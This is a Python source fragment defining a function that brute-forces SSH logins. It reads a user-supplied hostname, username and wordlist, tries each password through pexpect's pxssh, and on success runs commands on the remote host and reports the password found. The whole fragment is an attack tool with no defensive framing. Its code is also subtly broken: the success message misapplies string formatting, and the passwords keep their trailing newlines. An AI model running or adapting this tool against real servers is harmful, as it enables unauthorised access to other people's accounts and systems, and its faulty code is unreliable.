def ssh():
    import getpass
    from pexpect import pxssh

    correct_password = 0
    print (printcolors.OKGREEN + intro_text + printcolors.ENDC)
    print("\n" + printcolors.OKBLUE + credits_text + printcolors.ENDC + "\n")
    hostname = input(printcolors.OKBLUE + 'hostname: ' + printcolors.ENDC)
    username = input(printcolors.OKBLUE + 'username: ' + printcolors.ENDC)
    wordlist = input(printcolors.OKBLUE + 'wordlist: ' + printcolors.ENDC)
    wordlist = open(wordlist, "r")

    for password in wordlist:
      try:
        s = pxssh.pxssh()
        s.login (hostname, username, password)
        s.sendline ('uptime')   # run a command
        s.prompt()             # match the prompt
        print((s.before))
        s.sendline ('ls -l')
        s.prompt()
        print((s.before))
        s.sendline ('df')
        s.prompt()
        print((s.before))
        s.logout()
        print(printcolors.OKGREEN + '[+]Password Found: %' + printcolors.ENDC % password)
        correct_password += 1
        break;
      except (pxssh.ExceptionPxssh):
        print(printcolors.FAIL + "[-]Incorrect password: " + printcolors.ENDC + "%s, trying again..." % password)
    print(printcolors.OKBLUE + "Correct passwords found: " + printcolors.ENDC + str(correct_password))
